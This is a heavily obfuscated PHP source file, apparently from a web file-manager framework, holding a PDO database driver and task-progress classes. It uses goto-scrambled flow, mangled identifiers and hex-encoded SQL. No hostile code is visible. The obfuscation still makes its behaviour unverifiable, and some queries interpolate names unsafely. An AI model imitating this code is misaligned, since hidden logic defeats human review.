ë⁄ƒÑ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto d©Ø††¡„ ; Bê‡Õú®øÕ: } public function execute($aù—ÜˆÕ¨≈, $a≈Ø◊ßÊ¿Í = array()) { goto Açßóêƒ—ô; Bíùˆ√ùÏ§: $this->queryStr = $aù—ÜˆÕ¨≈; if (!empty($a≈Ø◊ßÊ¿Í)) { $this->queryStr .= $A›çùßçı“[842] . print_r($a≈Ø◊ßÊ¿Í, !0) . $A›çùßçı“[843]; } $Aåµ ’ã√µ = !1; goto f£‘™Çë÷¶; f£‘™Çë÷¶: if ($this->dbType == $A›çùßçı“[836]) { if (preg_match($A›çùßçı“[844], $this->queryStr, $D˘±ôÎ∫êÖ)) { $this->table = think_config($A›çùßçı“[845]) . str_ireplace(think_config($A›çùßçı“[846]), $A›çùßçı“[361], $D˘±ôÎ∫êÖ[2]); $Aåµ ’ã√µ = (bool) $this->query($A›çùßçı“[847] . strtoupper($this->table) . $A›çùßçı“[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($A›çùßçı“[21], 1); goto eﬂ‚õ∂–†ˆ; d≈†îÌ≈°∏: $A≈ôÕÿ¿ı‚ = $this->PDOStatement->execute($a≈Ø◊ßÊ¿Í); $this->debug(); if (!1 === $A≈ôÕÿ¿ı‚) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($Aåµ ’ã√µ || preg_match($A›çùßçı“[848], $aù—ÜˆÕ¨≈)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto aÚÙâë“€›; Açßóêƒ—ô: $A›çùßçı“ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Bíùˆ√ùÏ§; eﬂ‚õ∂–†ˆ: think_status($A›çùßçı“[20]); $this->PDOStatement = $this->_linkID->prepare($aù—ÜˆÕ¨≈); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto d≈†îÌ≈°∏; aÚÙâë“€›: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $dü°ﬁÏªä§ = $this->_linkID->commit(); $this->transTimes = 0; if (!$dü°ﬁÏªä§) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Bﬁ¯√≈´‘à = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Bﬁ¯√≈´‘à) { $this->error(); return !1; } } return !0; } private function getAll() { $F§Œ¨úª´€ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($F§Œ¨úª´€); return $F§Œ¨úª´€; } public function getFields($b®£„¡…¬≤) { goto F•ıóªóñÖ; Eﬁﬂé‡ÆìË: return $dæêÉ≥öÉõ; goto D≥úì™…àﬂ; F•ıóªóñÖ: $A¥öÊÏ°ÉÁ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $this->initConnect(!0); if (think_config($A¥öÊÏ°ÉÁ[849])) { $bíï∑äÚ·ò = str_replace($A¥öÊÏ°ÉÁ[850], $b®£„¡…¬≤, think_config($A¥öÊÏ°ÉÁ[849])); } else { switch ($this->dbType) { case $A¥öÊÏ°ÉÁ[833]: case $A¥öÊÏ°ÉÁ[851]: $bíï∑äÚ·ò = "\x53\105\x4c\105\103\x54\x20\x20\40\x63\157\154\x75\155\156\x5f\156\x61\x6d\145\x20\x61\x73\40\47\116\x61\155\x65\47\x2c\40\40\40\x64\141\164\x61\137\164\x79\x70\x65\40\x61\163\40\x27\124\x79\x70\x65\47\54\x20\x20\x20\143\157\154\165\155\156\137\144\x65\x66\x61\165\x6c\x74\x20\x61\163\40\47\104\145\146\141\165\154\164\47\x2c\40\40\40\151\163\137\x6e\x75\154\154\141\142\x6c\x65\x20\141\163\x20\x27\x4e\165\x6c\154\x27\12\x9\x9\x46\122\x4f\x4d\11\151\156\x66\x6f\162\x6d\141\164\151\x6f\156\x5f\x73\x63\150\x65\155\141\x2e\x74\x61\142\154\x65\x73\x20\x41\x53\x20\x74\12\x9\x9\x4a\x4f\111\x4e\11\x69\156\x66\157\x72\155\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\56\x63\157\154\165\155\156\163\x20\x41\x53\40\x63\12\11\11\117\116\x20\40\x74\x2e\164\x61\142\154\x65\x5f\x63\x61\164\141\x6c\x6f\147\40\75\40\x63\x2e\164\141\x62\154\x65\137\x63\141\164\x61\154\x6f\x67\xa\11\x9\x41\116\104\x20\x74\x2e\x74\141\x62\x6c\145\137\x73\x63\x68\x65\x6d\x61\40\75\40\143\56\164\141\x62\x6c\145\x5f\163\143\x68\x65\x6d\141\xa\11\11\x41\116\x44\x20\x74\56\164\141\x62\x6c\x65\x5f\156\141\155\x65\x20\x3d\40\x63\56\x74\x61\x62\x6c\x65\137\x6e\141\155\x65\xa\x9\11\127\x48\x45\x52\105\x20\40\40\x74\56\x74\141\x62\154\145\x5f\x6e\x61\155\x65\x20\75\40\x27{$b®£„¡…¬≤}\x27"; break; case $A¥öÊÏ°ÉÁ[852]: $bíï∑äÚ·ò = $A¥öÊÏ°ÉÁ[853] . $b®£„¡…¬≤ . $A¥öÊÏ°ÉÁ[854]; break; case $A¥öÊÏ°ÉÁ[834]: case $A¥öÊÏ°ÉÁ[836]: $bíï∑äÚ·ò = $A¥öÊÏ°ÉÁ[855] . $A¥öÊÏ°ÉÁ[856] . $A¥öÊÏ°ÉÁ[857] . strtoupper($b®£„¡…¬≤) . $A¥öÊÏ°ÉÁ[858] . strtoupper($b®£„¡…¬≤) . $A¥öÊÏ°ÉÁ[859]; break; case $A¥öÊÏ°ÉÁ[860]: $bíï∑äÚ·ò = $A¥öÊÏ°ÉÁ[861] . $b®£„¡…¬≤ . $A¥öÊÏ°ÉÁ[862]; break; case $A¥öÊÏ°ÉÁ[835]: break; case $A¥öÊÏ°ÉÁ[863]: default: $bíï∑äÚ·ò = $A¥öÊÏ°ÉÁ[864] . ($this->dbType == $A¥öÊÏ°ÉÁ[863] ? "\140{$b®£„¡…¬≤}\x60" : $b®£„¡…¬≤); } } goto Aü∞ﬂâ¨ò; Aü∞ﬂâ¨ò: $dÔÊ‹í…çè = $this->query($bíï∑äÚ·ò); $dæêÉ≥öÉõ = array(); if ($dÔÊ‹í…çè) { foreach ($dÔÊ‹í…çè as $b÷´πÖﬁ≤Û => $eáÇëΩÒ∫´) { $eáÇëΩÒ∫´ = array_change_key_case($eáÇëΩÒ∫´); $eáÇëΩÒ∫´[$A¥öÊÏ°ÉÁ[28]] = isset($eáÇëΩÒ∫´[$A¥öÊÏ°ÉÁ[28]]) ? $eáÇëΩÒ∫´[$A¥öÊÏ°ÉÁ[28]] : $A¥öÊÏ°ÉÁ[361]; $eáÇëΩÒ∫´[$A¥öÊÏ°ÉÁ[29]] = isset($eáÇëΩÒ∫´[$A¥öÊÏ°ÉÁ[29]]) ? $eáÇëΩÒ∫´[$A¥öÊÏ°ÉÁ[29]] : $A¥öÊÏ°ÉÁ[361]; $aé‰áÎàπ˜ = isset($eáÇëΩÒ∫´[$A¥öÊÏ°ÉÁ[261]]) ? $eáÇëΩÒ∫´[$A¥öÊÏ°ÉÁ[261]] : $eáÇëΩÒ∫´[$A¥öÊÏ°ÉÁ[28]]; $dæêÉ≥öÉõ[$aé‰áÎàπ˜] = array($A¥öÊÏ°ÉÁ[28] => $aé‰áÎàπ˜, $A¥öÊÏ°ÉÁ[29] => $eáÇëΩÒ∫´[$A¥öÊÏ°ÉÁ[29]], $A¥öÊÏ°ÉÁ[31] => (bool) (isset($eáÇëΩÒ∫´[$A¥öÊÏ°ÉÁ[99]]) && $eáÇëΩÒ∫´[$A¥öÊÏ°ÉÁ[99]] === $A¥öÊÏ°ÉÁ[33] || isset($eáÇëΩÒ∫´[$A¥öÊÏ°ÉÁ[31]]) && $eáÇëΩÒ∫´[$A¥öÊÏ°ÉÁ[31]] === $A¥öÊÏ°ÉÁ[33]), $A¥öÊÏ°ÉÁ[34] => isset($eáÇëΩÒ∫´[$A¥öÊÏ°ÉÁ[34]]) ? $eáÇëΩÒ∫´[$A¥öÊÏ°ÉÁ[34]] : (isset($eáÇëΩÒ∫´[$A¥öÊÏ°ÉÁ[53]]) ? $eáÇëΩÒ∫´[$A¥öÊÏ°ÉÁ[53]] : $A¥öÊÏ°ÉÁ[361]), $A¥öÊÏ°ÉÁ[36] => isset($eáÇëΩÒ∫´[$A¥öÊÏ°ÉÁ[89]]) ? strtolower($eáÇëΩÒ∫´[$A¥öÊÏ°ÉÁ[89]]) == $A¥öÊÏ°ÉÁ[38] : (isset($eáÇëΩÒ∫´[$A¥öÊÏ°ÉÁ[54]]) ? $eáÇëΩÒ∫´[$A¥öÊÏ°ÉÁ[54]] : !1), $A¥öÊÏ°ÉÁ[39] => isset($eáÇëΩÒ∫´[$A¥öÊÏ°ÉÁ[865]]) ? strtolower($eáÇëΩÒ∫´[$A¥öÊÏ°ÉÁ[865]]) == $A¥öÊÏ°ÉÁ[41] : (isset($eáÇëΩÒ∫´[$A¥öÊÏ°ÉÁ[89]]) ? $eáÇëΩÒ∫´[$A¥öÊÏ°ÉÁ[89]] : !1)); } } goto Eﬁﬂé‡ÆìË; D≥úì™…àﬂ: } public function getTables($Aâ”Ëäóã∂ = '') { $a≤Àƒèø Œ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (think_config($a≤Àƒèø Œ[866])) { $bÍàÓπ◊™‹ = str_replace($a≤Àƒèø Œ[867], $Aâ”Ëäóã∂, think_config($a≤Àƒèø Œ[866])); } else { switch ($this->dbType) { case $a≤Àƒèø Œ[834]: case $a≤Àƒèø Œ[836]: $bÍàÓπ◊™‹ = $a≤Àƒèø Œ[868]; break; case $a≤Àƒèø Œ[833]: case $a≤Àƒèø Œ[851]: $bÍàÓπ◊™‹ = $a≤Àƒèø Œ[869]; break; case $a≤Àƒèø Œ[860]: $bÍàÓπ◊™‹ = $a≤Àƒèø Œ[870]; break; case $a≤Àƒèø Œ[835]: think_exception(think_lang($a≤Àƒèø Œ[871]) . $a≤Àƒèø Œ[872]); break; case $a≤Àƒèø Œ[852]: $bÍàÓπ◊™‹ = $a≤Àƒèø Œ[42] . $a≤Àƒèø Œ[43] . $a≤Àƒèø Œ[44]; break; case $a≤Àƒèø Œ[863]: default: if (!empty($Aâ”Ëäóã∂)) { $bÍàÓπ◊™‹ = $a≤Àƒèø Œ[816] . $Aâ”Ëäóã∂; } else { $bÍàÓπ◊™‹ = $a≤Àƒèø Œ[817]; } } } $dáÎêﬂπÊÖ = $this->query($bÍàÓπ◊™‹); $a≈¿⁄ßôÖ÷ = array(); foreach ($dáÎêﬂπÊÖ as $BÈ¥æõŸ¥œ => $FÃïÈÔÎØﬁ) { $a≈¿⁄ßôÖ÷[$BÈ¥æõŸ¥œ] = current($FÃïÈÔÎØﬁ); } return $a≈¿⁄ßôÖ÷; } protected function parseLimit($Aï‰ŒôÇ‘») { $D•Ù»ÌîÜ¬ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $c°ÜÉñõÉ¬ = $D•Ù»ÌîÜ¬[33]; if (!empty($Aï‰ŒôÇ‘»)) { switch ($this->dbType) { case $D•Ù»ÌîÜ¬[860]: case $D•Ù»ÌîÜ¬[852]: $Aï‰ŒôÇ‘» = explode($D•Ù»ÌîÜ¬[47], $Aï‰ŒôÇ‘»); if (count($Aï‰ŒôÇ‘») > 1) { $c°ÜÉñõÉ¬ .= $D•Ù»ÌîÜ¬[48] . $Aï‰ŒôÇ‘»[1] . $D•Ù»ÌîÜ¬[49] . $Aï‰ŒôÇ‘»[0] . $D•Ù»ÌîÜ¬[50]; } else { $c°ÜÉñõÉ¬ .= $D•Ù»ÌîÜ¬[48] . $Aï‰ŒôÇ‘»[0] . $D•Ù»ÌîÜ¬[50]; } break; case $D•Ù»ÌîÜ¬[833]: case $D•Ù»ÌîÜ¬[851]: break; case $D•Ù»ÌîÜ¬[835]: break; case $D•Ù»ÌîÜ¬[834]: case $D•Ù»ÌîÜ¬[836]: break; case $D•Ù»ÌîÜ¬[863]: default: $c°ÜÉñõÉ¬ .= $D•Ù»ÌîÜ¬[48] . $Aï‰ŒôÇ‘» . $D•Ù»ÌîÜ¬[50]; } } return $c°ÜÉñõÉ¬; } public function parseKey(&$cäâÛ⁄»•ü, $bã©„ôÚˆô = true) { $F∏ë‹§∫ãÃ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if ($bã©„ôÚˆô) { $cäâÛ⁄»•ü = $this->parseKeyCheck($cäâÛ⁄»•ü); } if ($this->dbType == $F∏ë‹§∫ãÃ[863]) { if ($cäâÛ⁄»•ü != $F∏ë‹§∫ãÃ[176] && !preg_match($F∏ë‹§∫ãÃ[827], $cäâÛ⁄»•ü)) { $cäâÛ⁄»•ü = $F∏ë‹§∫ãÃ[828] . trim($cäâÛ⁄»•ü, $F∏ë‹§∫ãÃ[828]) . $F∏ë‹§∫ãÃ[828]; } return $cäâÛ⁄»•ü; } else { return parent::parseKey($cäâÛ⁄»•ü); } } public function close() { $this->_linkID = null; } public function error() { $b•¿ÀŒπ·à =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if ($this->PDOStatement) { $FŒÜé’ïﬁì = $this->PDOStatement->errorInfo(); $this->error = $FŒÜé’ïﬁì[1] . $b•¿ÀŒπ·à[4] . $FŒÜé’ïﬁì[2]; } else { $this->error = $b•¿ÀŒπ·à[33]; } if ($b•¿ÀŒπ·à[33] != $this->queryStr) { $this->error .= LNG($b•¿ÀŒπ·à[45]) . $this->queryStr; } think_trace($this->error, $b•¿ÀŒπ·à[33], $b•¿ÀŒπ·à[46]); return $this->error; } public function escapeString($bπÈ√å“ßñ) { $Fÿ√·ﬁ«ﬂ§ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; switch ($this->dbType) { case $Fÿ√·ﬁ«ﬂ§[860]: case $Fÿ√·ﬁ«ﬂ§[833]: case $Fÿ√·ﬁ«ﬂ§[851]: case $Fÿ√·ﬁ«ﬂ§[863]: return addslashes($bπÈ√å“ßñ); case $Fÿ√·ﬁ«ﬂ§[835]: case $Fÿ√·ﬁ«ﬂ§[852]: case $Fÿ√·ﬁ«ﬂ§[834]: case $Fÿ√·ﬁ«ﬂ§[836]: return str_ireplace($Fÿ√·ﬁ«ﬂ§[55], $Fÿ√·ﬁ«ﬂ§[56], $bπÈ√å“ßñ); } } protected function parseValue($eØì∞Úá«í) { $aâÇ£ıÍÌΩ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (is_string($eØì∞Úá«í)) { $eØì∞Úá«í = strpos($eØì∞Úá«í, $aâÇ£ıÍÌΩ[4]) === 0 ? $this->escapeString($eØì∞Úá«í) : $aâÇ£ıÍÌΩ[873] . $this->escapeString($eØì∞Úá«í) . $aâÇ£ıÍÌΩ[873]; } elseif (isset($eØì∞Úá«í[0]) && is_string($eØì∞Úá«í[0]) && strtolower($eØì∞Úá«í[0]) == $aâÇ£ıÍÌΩ[285]) { $eØì∞Úá«í = $this->escapeString($eØì∞Úá«í[1]); } elseif (is_array($eØì∞Úá«í)) { $eØì∞Úá«í = array_map(array($this, $aâÇ£ıÍÌΩ[874]), $eØì∞Úá«í); } elseif (is_bool($eØì∞Úá«í)) { $eØì∞Úá«í = $eØì∞Úá«í ? $aâÇ£ıÍÌΩ[83] : $aâÇ£ıÍÌΩ[468]; } elseif (is_null($eØì∞Úá«í)) { $eØì∞Úá«í = $aâÇ£ıÍÌΩ[99]; } return $eØì∞Úá«í; } public function getLastInsertId() { $dµª˜øÈò± =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; switch ($this->dbType) { case $dµª˜øÈò±[860]: case $dµª˜øÈò±[852]: case $dµª˜øÈò±[833]: case $dµª˜øÈò±[851]: case $dµª˜øÈò±[835]: case $dµª˜øÈò±[863]: return $this->_linkID->lastInsertId(); case $dµª˜øÈò±[834]: case $dµª˜øÈò±[836]: $DÀÔÙ¶Îœò = $this->table; $eè±éÎ≠À  = $this->query("\123\105\x4c\x45\x43\124\x20{$DÀÔÙ¶Îœò}\x2e\x63\x75\162\x72\166\141\x6c\x20\143\x75\x72\162\166\141\x6c\x20\106\122\x4f\115\x20\x64\165\x61\154"); return $eè±éÎ≠À  ? $eè±éÎ≠À [0][$dµª˜øÈò±[875]] : 0; } } } goto CçîÇ∂ºïù; fãäã†‚»ä: class Task { const STATYS_STOP = "\163\164\157\160"; const STATYS_RUNNING = "\x72\165\156\156\151\x6e\147"; const STATYS_KILL = "\x6b\151\x6c\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($c˘ô»áåì , $B÷‹ÜàﬁÑ⁄ = '', $c™ùí’ËÒ¡ = 0, $F≈ÁÑ¶Áõ = '') { goto Eîù¿©√≤ø; cπÑ‡Ú“®“: Hook::trigger($fƒ¬±∫öõ…[1449], $this->task); $this->task[$fƒ¬±∫öõ…[1443]] = timeFloat(); goto A≠®’≠˘´É; eøÊ›ä¢èÉ: Hook::bind($fƒ¬±∫öõ…[1404], array($this, $fƒ¬±∫öõ…[1446])); Hook::bind($fƒ¬±∫öõ…[1447], array($this, $fƒ¬±∫öõ…[1448])); $this->startAfter(); goto cπÑ‡Ú“®“; Eîù¿©√≤ø: $fƒ¬±∫öõ… =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (self::get($c˘ô»áåì )) { return; } $this->task = array($fƒ¬±∫öõ…[367] => $c˘ô»áåì , $fƒ¬±∫öõ…[1438] => USER_ID, $fƒ¬±∫öõ…[1344] => $F≈ÁÑ¶Áõ, $fƒ¬±∫öõ…[29] => $B÷‹ÜàﬁÑ⁄, $fƒ¬±∫öõ…[982] => $fƒ¬±∫öõ…[33], $fƒ¬±∫öõ…[980] => $c™ùí’ËÒ¡, $fƒ¬±∫öõ…[994] => 0, $fƒ¬±∫öõ…[1439] => 0, $fƒ¬±∫öõ…[1440] => 0, $fƒ¬±∫öõ…[1441] => timeFloat(), $fƒ¬±∫öõ…[1442] => 0, $fƒ¬±∫öõ…[1443] => 0, $fƒ¬±∫öõ…[1444] => 0, $fƒ¬±∫öõ…[1445] => 0, $fƒ¬±∫öõ…[689] => $fƒ¬±∫öõ…[1402]); goto eøÊ›ä¢èÉ; A≠®’≠˘´É: } public function end() { goto c∞›ß¬Ó—∞; c∞›ß¬Ó—∞: $cÖßÖœÏ√’ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$this->task) { return; } if ($this->task[$cÖßÖœÏ√’[1443]]) { self::valueSet($this->task[$cÖßÖœÏ√’[367]], !1); } goto DÓ‘øﬂ›ª‰; e∆öÈ≤ßË±: Hook::unbind($cÖßÖœÏ√’[1447], array($this, $cÖßÖœÏ√’[1448])); $this->endAfter(); $this->task = !1; goto c®◊ñﬂπ´Ü; DÓ‘øﬂ›ª‰: $bËòûÃÖ€µ = timeFloat() - $this->task[$cÖßÖœÏ√’[1441]]; self::log($cÖßÖœÏ√’[1450] . $this->task[$cÖßÖœÏ√’[367]] . $cÖßÖœÏ√’[1451] . $bËòûÃÖ€µ . $cÖßÖœÏ√’[1452]); Hook::unbind($cÖßÖœÏ√’[1404], array($this, $cÖßÖœÏ√’[1446])); goto e∆öÈ≤ßË±; c®◊ñﬂπ´Ü: } public function update($d‹è„ﬁÇ∏∂ = 0) { goto e∏¯†§⁄ô≥; Cä‡ÕÓèøÕ: $this->updateAfter(); $Dá÷âïﬁΩ‘ = 0.2; if (timeFloat() - $FæÁ’á¡“œ[$D˘ºœ‚éﬂë[1443]] < $Dá÷âïﬁΩ‘) { return; } goto D¥ÍÇ•™¶ö; D¥ÍÇ•™¶ö: $Déó÷òäçÈ = self::get($FæÁ’á¡“œ[$D˘ºœ‚éﬂë[367]]); $bÃÏÇ≈áå¥ = $Déó÷òäçÈ[$D˘ºœ‚éﬂë[689]]; if ($bÃÏÇ≈áå¥ == self::STATYS_KILL) { $eÓÉíôá®‰ = array($D˘ºœ‚éﬂë[1453] => LNG($D˘ºœ‚éﬂë[1454]), $D˘ºœ‚éﬂë[1036] => !1); Cache::set($D˘ºœ‚éﬂë[1455] . $this->task[$D˘ºœ‚éﬂë[367]], $eÓÉíôá®‰, 30); $this->end(); die; } else { if ($bÃÏÇ≈áå¥ == self::STATYS_STOP) { $b∑ÈÇ”∏ñê = 2; $Déó÷òäçÈ[$D˘ºœ‚éﬂë[1444]] += $b∑ÈÇ”∏ñê; self::valueSet($FæÁ’á¡“œ[$D˘ºœ‚éﬂë[367]], $Déó÷òäçÈ); sleep($b∑ÈÇ”∏ñê); $this->update(); return; } } goto Cå¯Á∆≈—∂; e∏¯†§⁄ô≥: $D˘ºœ‚éﬂë =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $FæÁ’á¡“œ =& $this->task; if (!$FæÁ’á¡“œ) { return; } goto Bù©õÖçöé; Cå¯Á∆≈—∂: $FæÁ’á¡“œ[$D˘ºœ‚éﬂë[689]] = $bÃÏÇ≈áå¥ ? $bÃÏÇ≈áå¥ : $FæÁ’á¡“œ[$D˘ºœ‚éﬂë[689]]; $FæÁ’á¡“œ[$D˘ºœ‚éﬂë[1444]] = $Déó÷òäçÈ[$D˘ºœ‚éﬂë[1444]] ? $Déó÷òäçÈ[$D˘ºœ‚éﬂë[1444]] : 0; $FæÁ’á¡“œ[$D˘ºœ‚éﬂë[1443]] = timeFloat(); goto dõ∞£ ƒŸ†; Bù©õÖçöé: $FæÁ’á¡“œ[$D˘ºœ‚éﬂë[994]] += $d‹è„ﬁÇ∏∂; $FæÁ’á¡“œ[$D˘ºœ‚éﬂë[1442]] = timeFloat(); if ($FæÁ’á¡“œ[$D˘ºœ‚éﬂë[980]]) { if ($FæÁ’á¡“œ[$D˘ºœ‚éﬂë[980]] < $FæÁ’á¡“œ[$D˘ºœ‚éﬂë[994]]) { $FæÁ’á¡“œ[$D˘ºœ‚éﬂë[980]] = $FæÁ’á¡“œ[$D˘ºœ‚éﬂë[994]]; } $A§ë¯†˘µÌ = timeFloat() - $FæÁ’á¡“œ[$D˘ºœ‚éﬂë[1441]] - $FæÁ’á¡“œ[$D˘ºœ‚éﬂë[1444]]; $FæÁ’á¡“œ[$D˘ºœ‚éﬂë[1439]] = $FæÁ’á¡“œ[$D˘ºœ‚éﬂë[994]] / $FæÁ’á¡“œ[$D˘ºœ‚éﬂë[980]]; $FæÁ’á¡“œ[$D˘ºœ‚éﬂë[1440]] = $FæÁ’á¡“œ[$D˘ºœ‚éﬂë[994]] / $A§ë¯†˘µÌ; if ($FæÁ’á¡“œ[$D˘ºœ‚éﬂë[1439]] > 0) { $FæÁ’á¡“œ[$D˘ºœ‚éﬂë[1445]] = $A§ë¯†˘µÌ * (1 - $FæÁ’á¡“œ[$D˘ºœ‚éﬂë[1439]]) / $FæÁ’á¡“œ[$D˘ºœ‚éﬂë[1439]]; } $FæÁ’á¡“œ[$D˘ºœ‚éﬂë[1445]] = $FæÁ’á¡“œ[$D˘ºœ‚éﬂë[1445]] <= 0 ? 0 : $FæÁ’á¡“œ[$D˘ºœ‚éﬂë[1445]]; } goto Cä‡ÕÓèøÕ; dõ∞£ ƒŸ†: Hook::trigger($D˘ºœ‚éﬂë[1456], $FæÁ’á¡“œ); self::valueSet($FæÁ’á¡“œ[$D˘ºœ‚éﬂë[367]], $FæÁ’á¡“œ); goto AÕ¶Œ†á®à; AÕ¶Œ†á®à: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($côô«Ùá‰Í) { $Dí™◊‹àßõ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; Cache::set($Dí™◊‹àßõ[1455] . $this->task[$Dí™◊‹àßõ[367]], $côô«Ùá‰Í, 60); return $côô«Ùá‰Í; } public static function get($fåÔ≠Üè°æ) { return self::valueGet($fåÔ≠Üè°æ); } public static function listData() { $bæÓ›æÜ‘¢ = self::valueGet(); return array_sort_by($bæÓ›æÜ‘¢, $_SERVER[Ä¿¡‡öóµŸﬂ‡][1441], !0); } public static function kill($cÃ◊Ñ∑Ìô©) { return self::changeStatus($cÃ◊Ñ∑Ìô©, self::STATYS_KILL); } public static function stop($B£¿•€Ü≥™) { return self::changeStatus($B£¿•€Ü≥™, self::STATYS_STOP); } public static function restart($B°†ª∑ÈΩ) { return self::changeStatus($B°†ª∑ÈΩ, self::STATYS_RUNNING); } public static function killAll() { $Dé‰—É·äå =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Aç˜´ÓÒ∏ñ = self::listData(); foreach ($Aç˜´ÓÒ∏ñ as $FåôÛ©≤∞Ã) { self::kill($FåôÛ©≤∞Ã[$Dé‰—É·äå[367]]); } sleep(2); foreach ($Aç˜´ÓÒ∏ñ as $FåôÛ©≤∞Ã) { self::valueSet($FåôÛ©≤∞Ã[$Dé‰—É·äå[367]], !1); } } private static function changeStatus($dë∞àµÑôÉ, $dà¡˘”óè„) { goto DàÇÖ∞›ú; BÃ¨ÕÇ≤©Ó: return !0; goto C©≈ËæÎÛ§; A◊†ÇÔ…ó: $dãù◊•À¯©[$FúﬂãÊÍ◊Ö[689]] = $dà¡˘”óè„; self::valueSet($dë∞àµÑôÉ, $dãù◊•À¯©); self::log($FúﬂãÊÍ◊Ö[1457] . $dãù◊•À¯©[$FúﬂãÊÍ◊Ö[367]] . $FúﬂãÊÍ◊Ö[1458] . $dà¡˘”óè„); goto BÃ¨ÕÇ≤©Ó; DàÇÖ∞›ú: $FúﬂãÊÍ◊Ö =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $dãù◊•À¯© = self::valueGet($dë∞àµÑôÉ); if (!$dãù◊•À¯©) { return !1; } goto A◊†ÇÔ…ó; C©≈ËæÎÛ§: } public static function valueGet($F·ïåîñŸ· = false) { $eËùà”®·≈ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if ($F·ïåîñŸ·) { $F„êé∫à›Ü = Model($eËùà”®·≈[399])->where(array($eËùà”®·≈[89] => $F·ïåîñŸ·, $eËùà”®·≈[29] => $eËùà”®·≈[1459]))->find(); return $F„êé∫à›Ü ? json_decode($F„êé∫à›Ü[$eËùà”®·≈[359]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($Eãè∑ÃÊû£ = false) { goto DÓíπº·•≠; aÃä•ÿ∫Ë˜: $dáÂ’çöÖÈ = Model($cø‹èîªëû[399])->where($c€·µóôÙ)->select(); $dáÂ’çöÖÈ = $dáÂ’çöÖÈ ? $dáÂ’çöÖÈ : array(); foreach ($dáÂ’çöÖÈ as $E≤›ƒ©ö±¡ => $bìõ®·≥‹ê) { $dáÂ’çöÖÈ[$E≤›ƒ©ö±¡] = json_decode($bìõ®·≥‹ê[$cø‹èîªëû[359]], !0); } goto AäÃ”ãò∑√; AäÃ”ãò∑√: return $dáÂ’çöÖÈ; goto B¶≥¨Úπñ™; DÓíπº·•≠: $cø‹èîªëû =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $c€·µóôÙ = array($cø‹èîªëû[29] => $cø‹èîªëû[1459]); if ($Eãè∑ÃÊû£) { $c€·µóôÙ[$cø‹èîªëû[1438]] = $Eãè∑ÃÊû£; } goto aÃä•ÿ∫Ë˜; B¶≥¨Úπñ™: } public static function valueSet($fÎ£´áÚêî, $e¨Ïπ÷®Âˆ) { goto EÁÃÑÜ„Ç·; c®ÜäÕ™åÚ: if (!$E◊∏©ˆÖä€) { ob_start(); var_dump($e¨Ïπ÷®Âˆ); $eÒ£ÙŒìü¯ = ob_get_clean(); self::log($a¨ñÔÁ•ıœ[1460] . json_encode_force($eÒ£ÙŒìü¯)); } if (!$fÎ£´áÚêî || !$e¨Ïπ÷®Âˆ[$a¨ñÔÁ•ıœ[367]]) { return !1; } $Aù¶öëˆÖÎ = array($a¨ñÔÁ•ıœ[29] => $a¨ñÔÁ•ıœ[1459], $a¨ñÔÁ•ıœ[1438] => USER_ID, $a¨ñÔÁ•ıœ[89] => $fÎ£´áÚêî, $a¨ñÔÁ•ıœ[359] => $E◊∏©ˆÖä€); goto F‚Î€Éèê∑; EÁÃÑÜ„Ç·: $a¨ñÔÁ•ıœ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$e¨Ïπ÷®Âˆ) { return Model($a¨ñÔÁ•ıœ[399])->where(array($a¨ñÔÁ•ıœ[89] => $fÎ£´áÚêî, $a¨ñÔÁ•ıœ[29] => $a¨ñÔÁ•ıœ[1459]))->delete(); } $E◊∏©ˆÖä€ = json_encode($e¨Ïπ÷®Âˆ); goto c®ÜäÕ™åÚ; F‚Î€Éèê∑: Model($a¨ñÔÁ•ıœ[399])->add($Aù¶öëˆÖÎ, array(), !0); goto f–¥‡Áú¶‚; f–¥‡Áú¶‚: } public static function log($cƒºïì“æí) { write_log($cƒºïì“æí, $_SERVER[Ä¿¡‡öóµŸﬂ‡][1461]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto a∂ÿ∞æ∑–◊; a∂ÿ∞æ∑–◊: $d≤û–Îçª° =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $dØøâ¨®ºñ =& $this->task; $this->sourceCopyFolder = !1; goto bãÃâ»ãé∏; eóŒäÒ∫¿ø: Hook::bind($d≤û–Îçª°[1472], array($this, $d≤û–Îçª°[1473])); Hook::bind($d≤û–Îçª°[532], array($this, $d≤û–Îçª°[1474])); $this->sourceModelCopyFlag = !1; goto B™‹Æ≤ôë; døÜá¬Ö»‰: Hook::bind($d≤û–Îçª°[543], array($this, $d≤û–Îçª°[1470])); 